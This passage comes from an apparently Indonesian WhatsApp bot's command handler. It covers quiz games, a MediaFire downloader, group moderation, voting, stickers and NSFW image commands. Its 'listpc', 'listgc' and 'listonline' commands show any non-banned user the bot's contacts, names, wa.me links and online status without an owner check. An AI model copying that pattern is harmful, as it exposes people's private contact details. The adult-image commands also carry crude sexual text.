} else if (args[0] === 'lirik') {
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
let result = anu[Math.floor(Math.random() * anu.length)]
rikibos.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
rikibos.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, rikibos.user.name, m)
delete tebaklirik[m.sender.split('@')[0]]
}
} else if (args[0] === 'lontong') {
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
let result = anu[Math.floor(Math.random() * anu.length)]
rikibos.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
})
await sleep(60000)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
rikibos.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, rikibos.user.name, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
}
}
}
break
//=================================================//
case 'mediafire': {
if (isBan) throw sticBanLu(from)
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return  
if (!text) throw '*Enter a Link Query!*'
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw '*The link you provided is not valid*'
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 100) return reply('*File Over Limit* '+util.format(baby1))
const result4 = `*DOWNLOAD MEDIAFIRE*

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}\n
_whoa wait zimbot processing..._

*𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳*`
reply(`${result4}`)
rikibos.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : rik }).catch ((err) => reply('*Failed to download File*'))
}
break
//=================================================//
case 'kuismath': case 'math': {
if (isBan) throw sticBanLu(from)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let { genMath, modes } = require('./rikilah/dbnye/math')
if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
let result = await genMath(text.toLowerCase())
rikibos.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
delete kuismath[m.sender.split('@')[0]]
}
}
break
//=================================================//
case 'jodohku': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
let member = participants.map(u => u.id)
let me = m.sender
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `👫Jodoh mu adalah
@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let ments = [me, jodoh]
let buttons = [
{ buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
]
await rikibos.sendButtonText(m.chat, buttons, jawab, rikibos.user.name, m, {mentions: ments})
}
break
//=================================================//
case 'jadian': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤
@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let menst = [orang, jodoh]
let buttons = [
{ buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
]
await rikibos.sendButtonText(m.chat, buttons, jawab, rikibos.user.name, m, {mentions: menst})
}
break
//=================================================//
case 'react': {
 reactionMessage = {
react: {
text: '🇮🇩',
key: { remoteJid: from, fromMe: false, id: quoted.id }
}
}
rikibos.sendMessage(from, reactionMessage)
}
break
//=================================================//
case 'join': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
let result = args[0].split('https://chat.whatsapp.com/')[1]
await rikibos.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'keluar': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
await rikibos.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'setexif': {
if (isBan) throw sticBanLu(from)
 if (isBan) throw sticBanLu(from)
 if (!text) throw `Example : ${prefix + command} packname|author`
global.packname = text.split("|")[0]
global.author = text.split("|")[1]
reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
}
break
//=================================================//
case 'kick': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rikibos.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'add': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rikibos.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'promote': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rikibos.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'demote': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rikibos.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'block': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rikibos.updateBlockStatus(users, 'block').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rikibos.updateBlockStatus(users, 'unblock').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'setbio':
				if (!isCreator) return sticOwner(mess.only.owner)
				if (args.length < 1) return reply('Teksnya?')
					iyek = body.slice(9)
					rikibos.setStatus(`${iyek}`)
					reply(`Sukses mengganti bio ke ${body.slice(9)}`)
					break
//=================================================//
//=================================================//
case 'setname': case 'setsubject': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Text ?'
await rikibos.groupUpdateSubject(m.chat, text).then((res) => sticSukses(from)).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'setdesc': case 'setdesk': {
if (isBan) throw sticBanLu(from)
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Text ?'
await rikibos.groupUpdateDescription(m.chat, text).then((res) => sticSukses(from)).catch((err) => reply(jsonformat(err)))
}
break
//=================================================//
case 'nsfw': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiNsfw) return m.reply('Sudah Aktif')
ntnsfw.push(from)
m.reply('Sukses Telah mengaktifkan Nsfw Di group Ini')
var groupe = await rikibos.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
rikibos.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return m.reply('Sudah Non Aktif')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
m.reply('Sukses Mematikan Nsfw di group ini')
} else {
let buttonsntnsfw = [
{ buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
]
await rikibos.sendButtonText(m.chat, buttonsntnsfw, `Klick Button Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan
\n\n*WELCOME\n\n
trap
gasm
nwaifu
hneko `, `${global.botname}`, m)
}
}
break
case 'trap' :
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return reply(mess.nsfw)
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)
 let trapbot = [
 {buttonId: `trap`, buttonText: {displayText: `Next ⚡`}, type: 1},
 ]
let button2Messages = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
buttons: trapbot,
headerType: 1
}
 await rikibos.sendMessage(m.chat, button2Messages, { quoted:m }).catch(err => {
 return('Error!')
})
break
case 'hentai-neko' :
case 'hneko' :
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return reply(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 let hnekobot = [
 {buttonId: `.hneko`, buttonText: {displayText: `Next ⚡`}, type: 1},
 ]
let button3Messages = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
buttons: hnekobot,
headerType: 1
} 
 await rikibos.sendMessage(m.chat, button3Messages, { quoted:m }).catch(err => {
 return('Error!')
})
break
case 'hentai-waifu' :
case 'nwaifu' :
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return reply(mess.nsfw)
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 let nwaifubot = [
 {buttonId: `.hneko`, buttonText: {displayText: `Next ⚡`}, type: 1},
 ]
let button4Messages = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
buttons: nwaifubot,
headerType: 1
} 
 await rikibos.sendMessage(m.chat, button4Messages, { quoted:m }).catch(err => {
 return('Error!')
})
break
case 'gasm':
if (isBan) throw sticBanLu(from)
if (!AntiNsfw) return reply(mess.nsfw)
reply(mess.wait) 
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
var wbuttsss = [
{buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
]
 let buttonsssMessages = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
 footer: `${global.botname}`,
 buttons: wbuttsss,
 headerType: 4
 }
 await rikibos.sendMessage(m.chat, buttonsssMessages,{ quoted:m }).catch(err => {
 return('Error!')
})
break
case 'setppbot': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
sticWait(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
var media = await rikibos.downloadAndSaveMediaMessage(quoted)
try {
if (args[0] == "/full") {
const { generateProfilePicture } = require("./rikilah/lib/myfunc")
var { img } = await generateProfilePicture(media)
await rikibos.query({ tag: 'iq',attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
} else { await rikibos.updateProfilePicture(botNumber, { url: media }) }
m.reply(mess.success)
} catch { m.reply('Gagal Mengganti Photo Profile') }
}
break
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
sticWait(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await rikibos.downloadAndSaveMediaMessage(quoted)
try {
if (args[0] == "/full") {
const { generateProfilePicture } = require("./rikilah/lib/myfunc")
var { img } = await generateProfilePicture(media)
await rikibos.query({ tag: 'iq',attrs: { to: m.chat, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
} else { await rikibos.updateProfilePicture(m.chat, { url: media }) }
m.reply(mess.success)
} catch { m.reply('Gagal Mengganti Photo Profile') }
}
break
//=================================================//
case 'tagall': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
rikibos.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: rik })
}
break
//=================================================//
case 'hidetag': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
rikibos.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: rik })
}
break
//=================================================//
case 'style': case 'styletext': {
if (isBan) throw sticBanLu(from) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
let { styletext } = require('./rikilah/lib/scraper')
if (!text) throw 'Masukkan Query text!'
let anu = await styletext(text)
let teks = `Srtle Text From ${text}\n\n`
for (let i of anu) {
teks += `⭔ *${i.name}* : ${i.result}\n\n`
}
reply(teks)
}
break
//=================================================//
 case 'vote': {
 if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
vote[m.chat] = [q, [], []]
await sleep(1000)
upvote = vote[m.chat][1]
devote = vote[m.chat][2]
teks_vote = `*「 VOTE 」*
*Alasan:* ${vote[m.chat][0]}
┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────
┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────
*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
{buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
{buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]
let buttonMessageVote = {
text: teks_vote,
footer: rikibos.user.name,
buttons: buttonsVote,
headerType: 1
}
rikibos.sendMessage(m.chat, buttonMessageVote)
}
break
//=================================================//
 case 'upvote': {
 if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
isVote = vote[m.chat][1].concat(vote[m.chat][2])
wasVote = isVote.includes(m.sender)
if (wasVote) throw 'Kamu Sudah Vote'
vote[m.chat][1].push(m.sender)
menvote = vote[m.chat][1].concat(vote[m.chat][2])
teks_vote = `*「 VOTE 」*
*Alasan:* ${vote[m.chat][0]}
┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────
┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────
*${prefix}hapusvote* - untuk menghapus vote`
let buttonsUpvote = [
{buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
{buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]
let buttonMessageUpvote = {
text: teks_vote,
footer: rikibos.user.name,
buttons: buttonsUpvote,
headerType: 1,
mentions: menvote
 }
rikibos.sendMessage(m.chat, buttonMessageUpvote)
}
 break
//=================================================//
case 'devote': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
isVote = vote[m.chat][1].concat(vote[m.chat][2])
wasVote = isVote.includes(m.sender)
if (wasVote) throw 'Kamu Sudah Vote'
vote[m.chat][2].push(m.sender)
menvote = vote[m.chat][1].concat(vote[m.chat][2])
teks_vote = `*「 VOTE 」*
*Alasan:* ${vote[m.chat][0]}
┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────
┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────
*${prefix}hapusvote* - untuk menghapus vote`
let buttonsDevote = [
{buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
{buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]
let buttonMessageDevote = {
text: teks_vote,
footer: rikibos.user.name,
buttons: buttonsDevote,
headerType: 1,
mentions: menvote
}
rikibos.sendMessage(m.chat, buttonMessageDevote)
}
break
//=================================================// 
case 'cekvote':
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*
*Alasan:* ${vote[m.chat][0]}
┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────
┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────
*${prefix}hapusvote* - untuk menghapus vote
©${rikibos.user.id}`
rikibos.sendTextWithMentions(m.chat, teks_vote, m)
break
case 'deletevote': case'delvote': case 'hapusvote': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
delete vote[m.chat]
reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
}
break
case 'clearall':
				if (!isCreator) return reply(mess.only.owner)
					anu = await store.chats.all()
					rikibos.setMaxListeners(26)
					for (let _ of anu) {
						rikibos.deletechat(_.jid)
					}
					m.reply('Sukses membersihkan semua pesan')
					break
//=================================================//
 case 'group': case 'grup': {
 if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (args[0] === 'close'){
await rikibos.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'open'){
await rikibos.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`Sukses Membuka Group`)).catch((err) => reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
]
await rikibos.sendButtonText(m.chat, buttons, `Mode Group`, rikibos.user.name, m)
 }
}
break
//=================================================//
case 'editinfo': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
 if (args[0] === 'open'){
await rikibos.groupSettingUpdate(m.chat, 'unlocked').then((res) => reply(`Sukses Membuka Edit Info Group`)).catch((err) => reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await rikibos.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Sukses Menutup Edit Info Group`)).catch((err) => reply(jsonformat(err)))
 } else {
 let buttons = [
{ buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
]
await rikibos.sendButtonText(m.chat, buttons, `Mode Edit Info`, rikibos.user.name, m)
}
}
break
//=================================================//
 case 'mute': {
 if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].mute) return reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].mute = true
reply(`${rikibos.user.name} telah di mute di group ini !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].mute) return reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].mute = false
reply(`${rikibos.user.name} telah di unmute di group ini !`)
} else {
 let buttons = [
{ buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
]
await rikibos.sendButtonText(m.chat, buttons, `Mute Bot`, rikibos.user.name, m)
}
 }
 break
//=================================================//
case 'linkgroup': case 'linkgc': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
let response = await rikibos.groupInviteCode(m.chat)
rikibos.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'ephemeral': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Masukkan value enable/disable'
if (args[0] === 'enable') {
await rikibos.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'disable') {
await rikibos.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
}
break
//=================================================//
case 'delete': case 'del': {
if (isBan) throw sticBanLu(from)
if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
rikibos.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
//=================================================//
case 'infochat': {
if (isBan) throw sticBanLu(from)
if (!m.quoted) reply('Reply Pesan')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `⭔ @${i.userJid.split('@')[0]}\n`
teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
}
rikibos.sendTextWithMentions(m.chat, teks, m)
}
break
//=================================================//
case 'q': case 'quoted': {
if (isBan) throw sticBanLu(from)
if (!m.quoted) return reply('Reply Pesannya!!')
let wokwol = await rikibos.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return reply('Pesan Yang anda reply tidak mengandung reply')
await wokwol.quoted.copyNForward(m.chat, true)
}
break
//=================================================//
case 'listpc': {
if (isBan) throw sticBanLu(from)
 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
 for (let i of anu) {
 let nama = store.messages[i].array[0].pushName
 teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 rikibos.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
case 'listgc': {
if (isBan) throw sticBanLu(from)
 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
 for (let i of anu) {
 let metadata = await rikibos.groupMetadata(i)
 teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 rikibos.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
 case 'listonline': case 'liston': {
 if (isBan) throw sticBanLu(from)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
rikibos.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
//=================================================//
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await rikibos.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await rikibos.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
//=================================================//
case 'ebinary': {
